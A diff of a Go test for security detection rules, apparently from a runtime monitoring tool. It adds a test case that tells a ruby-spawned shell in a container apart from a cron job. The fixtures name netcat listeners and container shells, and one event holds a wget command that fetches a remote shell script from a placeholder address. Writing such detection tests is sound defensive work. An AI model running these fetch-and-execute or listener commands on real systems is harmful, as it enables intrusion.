@@ -85,7 +85,8 @@ func TestBuiltinRules(t *testing.T) {
 		{"run_from_temp_dir", exec("x", "/tmp/x", "bash", ""), exec("ls", "/usr/bin/ls", "bash", "")},
 		{"unexpected_listener", &Event{Type: TypeListen, Comm: "nc", Port: 23}, &Event{Type: TypeListen, Comm: "nginx", Port: 80}},
 		{"shell_in_container", exec("sh", "/bin/sh", "node", "web"), exec("sh", "/bin/sh", "runc", "web")},
-		{"shell_in_container", exec("sh", "/bin/sh", "node", "web"), exec("sh", "/bin/sh", "", "web")}, // a health check
+		{"shell_in_container", exec("sh", "/bin/sh", "node", "web"), exec("sh", "/bin/sh", "", "web")},     // a health check
+		{"shell_in_container", exec("sh", "/bin/sh", "ruby", "web"), exec("sh", "/bin/sh", "cron", "web")}, // a cron job
 		{"download_tool_in_container", exec("curl", "/usr/bin/curl", "sh", "web"), exec("curl", "/usr/bin/curl", "sh", "")},
 		{"download_tool_in_container",
 			&Event{Type: TypeExec, Comm: "wget", Container: "web", Args: []string{"wget", "-qO-", "http://203.0.113.9/x.sh"}},
